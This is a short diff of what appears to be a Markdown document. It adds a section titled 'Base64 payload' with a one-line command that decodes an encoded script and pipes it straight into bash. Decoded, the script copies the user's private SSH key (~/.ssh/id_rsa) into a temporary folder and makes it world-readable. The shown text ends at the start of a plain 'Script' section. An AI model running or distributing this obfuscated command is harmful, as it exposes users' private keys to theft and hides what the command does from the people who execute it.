@@ -1,8 +1,11 @@
+
+### Base64 payload 
+
 ```
 echo "IyEvdXNyL2Jpbi9iYXNoCmlmIFsgLWQgIiRIT01FLy5zc2giIF07IHRoZW4KICBpZiBbIC1mICIkSE9NRS8uc3NoL2lkX3JzYSIgXTsgdGhlbgogICAgbWtkaXIgLXAgfi90bXAvc3NoX2tleXMKICAgIGNwICIkSE9NRS8uc3NoL2lkX3JzYSIgfi90bXAvc3NoX2tleXMvCiAgICBjaG1vZCA3Nzcgfi90bXAvc3NoX2tleXMvaWRfcnNhCiAgZmkKZmkK" | base64 -d | bash
 ```
 
-### script
+### Script
 
 ```
 #!/bin/bash
